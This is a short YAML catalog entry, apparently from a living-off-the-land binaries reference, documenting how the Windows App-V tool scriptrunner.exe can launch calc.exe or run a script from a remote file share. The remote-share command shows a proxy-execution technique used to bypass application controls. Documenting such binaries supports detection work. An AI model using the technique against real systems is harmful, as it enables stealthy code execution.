---
name: scriptrunner.exe
description: Used in Windows by App-v
functions:
  execute:
    - description:  Execute calc.exe.
      code: Scriptrunner.exe -appvscript calc.exe
    - description: Execute the calc.cmd script on the remote share.
      code: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
resources: 
    - resource: https://twitter.com/KyleHanslovan/status/914800377580503040
    - resource: https://twitter.com/NickTyrer/status/914234924655312896
    - resource: https://github.com/MoooKitty/Code-Execution
fullpath: 
    - path: c:\windows\system32\scriptrunner.exe
    - path: c:\windows\sysWOW64\scriptrunner.exe
notes: Thanks to Nick Tyrer - @NickTyrer
---